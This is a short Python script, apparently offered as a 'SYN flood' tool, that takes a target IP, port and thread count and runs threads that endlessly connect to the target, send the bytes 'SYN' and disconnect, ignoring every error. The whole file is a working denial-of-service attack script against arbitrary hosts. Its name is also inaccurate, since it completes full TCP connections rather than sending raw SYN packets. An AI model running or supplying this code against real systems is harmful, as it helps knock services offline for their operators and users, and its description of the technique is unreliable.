import argparse
import socket
import threading

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Target IP address")
ap.add_argument("-p", "--port", required=True, type=int, help="Target port number")
ap.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
args = vars(ap.parse_args())

ip = args['ip']
port = args['port']
threads = args['threads']

def syn_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b"SYN")
            s.close()
        except:
            pass

for i in range(threads):
    t = threading.Thread(target=syn_flood)
    t.start() 